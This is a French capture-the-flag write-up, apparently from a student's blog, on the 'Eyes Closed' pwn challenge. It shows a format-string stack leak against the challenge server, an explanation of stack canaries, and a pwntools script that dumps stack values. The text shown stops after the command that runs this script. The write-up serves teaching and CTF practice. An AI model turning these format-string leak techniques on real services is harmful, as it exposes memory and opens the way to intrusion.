@@ -1,0 +1,1451 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - Eyes Closed | Hackrocks &amp; HackArmour CTF 2022 | Catégorie Pwn | [Vozec/FR] &amp; [Electro/FR]</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Eyes&#32;Closed&#32;|&#32;Hackrocks&#32;&amp;&#32;HackArmour&#32;CTF&#32;2022&#32;|&#32;Catégorie&#32;Pwn&#32;|&#32;[Vozec/FR]&#32;&amp;&#32;[Electro/FR] />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;Eyes&#32;Closed&#32;|&#32;Hackrocks&#32;&amp;&#32;HackArmour&#32;CTF&#32;2022&#32;|&#32;Catégorie&#32;Pwn&#32;|&#32;[Vozec/FR]&#32;&amp;&#32;[Electro/FR] />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Eyes&#32;Closed&#32;|&#32;Hackrocks&#32;&amp;&#32;HackArmour&#32;CTF&#32;2022&#32;|&#32;Catégorie&#32;Pwn&#32;|&#32;[Vozec/FR]&#32;&amp;&#32;[Electro/FR] />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;Eyes&#32;Closed&#32;|&#32;Hackrocks&#32;&amp;&#32;HackArmour&#32;CTF&#32;2022&#32;|&#32;Catégorie&#32;Pwn&#32;|&#32;[Vozec/FR]&#32;&amp;&#32;[Electro/FR] />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022" />
+<meta itemprop="description" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022" />
+<meta property="og:description" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022" />
+<meta name="twitter:description" content="Eyes Closed | Hackrocks &amp; HackArmour CTF 2022" />
+
+
+<base href="//localhost:1313/writeups/eyes_closed-hackarmour-2022/" />
+<link rel="canonical" href="//localhost:1313/writeups/eyes_closed-hackarmour-2022/" itemprop="url" />
+<meta name="url" content="//localhost:1313/writeups/eyes_closed-hackarmour-2022/" />
+<meta name="twitter:url" content="//localhost:1313/writeups/eyes_closed-hackarmour-2022/" />
+<meta property="og:url" content="//localhost:1313/writeups/eyes_closed-hackarmour-2022/" />
+
+
+<meta property="og:updated_time" content="2022-05-22T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/eyes_closed-hackarmour-2022/">Eyes Closed | Hackrocks &amp; HackArmour CTF 2022 | Catégorie Pwn | [Vozec/FR] &amp; [Electro/FR]</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2022-05-22T12:00:00Z" class="post-date">
+        May 22, 2022
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>8 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-pwn">
+        <a href="//localhost:1313/tags/pwn">pwn</a>
+      </li>
+      
+      <li class="tag-tuto">
+        <a href="//localhost:1313/tags/tuto">tuto</a>
+      </li>
+      
+      <li class="tag-writeup">
+        <a href="//localhost:1313/tags/writeup">writeup</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h1 id="eyes-closed--hackrocks--hackarmour-ctf-2022">Eyes Closed | Hackrocks &amp; HackArmour CTF 2022</h1>
+<h2 id="necessaires">Necessaires</h2>
+<ul>
+<li>Netcat</li>
+<li>Python3 (+ pwntool)</li>
+</ul>
+<h2 id="flag">Flag</h2>
+<pre tabindex="0"><code>flag{br0p0p0p0p0_with_f0rm4t_$7ringggg}
+</code></pre><h2 id="solution-détaillée">Solution détaillée</h2>
+<p>Le but du challenge est d&rsquo;exploiter une format string puis d&rsquo;utiliser un buffer overflow pour ainsi construire une ropchain et ainsi pouvoir prendre le contrôle du binaire grâce à une attaque ret2libc.</p>
+<h5 id="un-peu-dexplication-">Un peu d&rsquo;explication :</h5>
+<p>La méthode finale est la même que dans un de mes <a href="https://vozec.fr/writeups/vacation2-tjctf-2022/" target="_blank">précédents article</a> .
+Ce Writeup va donc se focaliser sur la partie <strong>Blind</strong> du challenge ainsi que l&rsquo;exploitation des <strong>formats strings</strong></p>
+<h5 id="découverte-du-challenge-">Découverte du challenge :</h5>
+<p>Seule une connexion TCP nous ai donné</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
+</span></span><span style="display:flex;"><span>➜   nc warzone.hackrocks.com <span style="color:#ae81ff">7772</span>
+</span></span><span style="display:flex;"><span>close your eyes and imagine something
+</span></span><span style="display:flex;"><span>tell me, what did you see?:
+</span></span><span style="display:flex;"><span>INPUT1
+</span></span><span style="display:flex;"><span>a INPUT1 ?nice one
+</span></span><span style="display:flex;"><span>please, give me a feedback:
+</span></span><span style="display:flex;"><span>INPUT2
+</span></span><span style="display:flex;"><span>thanks, see you later
+</span></span></code></pre></div><p>Une première chose qui saute au yeux est que notre première entrée est réfléchis .</p>
+<p>Voici ce que l&rsquo;on obtient si on envoie des <strong>formats strings</strong> : <code>%p.%p.%p.%p.%p.%p.%p.%p</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>close your eyes and imagine something
+</span></span><span style="display:flex;"><span>tell me, what did you see?:
+</span></span><span style="display:flex;"><span>%p.%p.%p.%p.%p.%p.%p.%p
+</span></span><span style="display:flex;"><span>a 0x7ffdfbc1c8f0.<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>.<span style="color:#f92672">(</span>nil<span style="color:#f92672">)</span>.0x17.0xffffffffffffff88.0x70252e70252e7025.0x252e70252e70252e.0x70252e70252e70 ?nice one
+</span></span><span style="display:flex;"><span>please, give me a feedback:
+</span></span></code></pre></div><p>On a donc un leak directement dans la mémoire du binaire !</p>
+<p>La description du challenge nous informe sur les sécurités du binaire exécuté à distance :</p>
+<ul>
+<li><em>Canary</em> : <code>ON</code></li>
+<li><em>NX</em> : <code>ON</code></li>
+<li><em>PIE</em> : <code>ON</code></li>
+<li><em>RELRO</em> : <code>ON</code></li>
+</ul>
+<p>On va donc essayer de contourner la protection : <code>Canary</code></p>
+<h6 id="explication-de-la-protection-canary">Explication de la protection Canary</h6>
+<p>Imaginons un buffer de 60 caractères , un canary est un octet qui va se positionner en 61ème place et qui va contrôler qu&rsquo;aucun débordement de mémoire n&rsquo;a lieu :</p>
+<ul>
+<li>
+<p><code>Mémoire Classique</code> :
+<em>[</em>&mdash;&mdash;&mdash;-MA-MEMOIRE&mdash;&mdash;&mdash;<em>]</em> <em>[</em>&mdash;-CANARY&mdash;-<em>]</em> <em>[</em>&mdash;-SUITE&mdash;-<em>]</em></p>
+</li>
+<li>
+<p><code>Mémoire Avec un overflow</code> :
+<em>[<em>AAAAAAAAAAAAAAAAAAAAAAAAAAAAA] <strong>AAAAAA</strong> <em>[</em>&mdash;-CANARY&mdash;-</em>]</em>[<em>&mdash;-SUITE&mdash;-</em>]_</p>
+</li>
+</ul>
+<p>Ici , la place du Canary a était modifié de +6 avec un Overflow et la protection va se déclencher et arrêter le programme.</p>
+<p>On devine que la 2nd entrée est vulnérable à un <strong>Buffer Overflow</strong> . On peut être en évidence la protection Canary :</p>
+<p><img src="./img/canary.png" alt="Alt text"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*** stack smashing detected ***: terminated
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>    <span style="color:#ae81ff">373</span> abort      ./eyes_closed
+</span></span></code></pre></div><h5 id="leak-de-la-mémoire-">Leak de la mémoire :</h5>
+<p>On peut donc écrire un programme pour faire leak la mémoire et localiser le Canary :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;critical&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;warzone.hackrocks.com&#39;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">7772</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Get_proc</span>():	<span style="color:#66d9ef">return</span> remote(url,port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Dump_stack</span>(string<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#34; [+] Leaking all the Stack ...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">200</span>):
+</span></span><span style="display:flex;"><span>		proc <span style="color:#f92672">=</span> Get_proc()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		proc<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;what did you see?:&#39;</span>)
+</span></span><span style="display:flex;"><span>		payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(string):
+</span></span><span style="display:flex;"><span>			payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA....</span><span style="color:#e6db74">%%%d</span><span style="color:#e6db74">$p....</span><span style="color:#e6db74">%%%d</span><span style="color:#e6db74">$s&#34;</span> <span style="color:#f92672">%</span> (_,_)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA....</span><span style="color:#e6db74">%%%d</span><span style="color:#e6db74">$p&#34;</span> <span style="color:#f92672">%</span> _
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		proc<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>		proc<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>		res <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">%</span>(_,res))
+</span></span><span style="display:flex;"><span>		proc<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dump_stack(<span style="color:#66d9ef">True</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /c
+</span></span><span style="display:flex;"><span>➜   python3 writeup.py
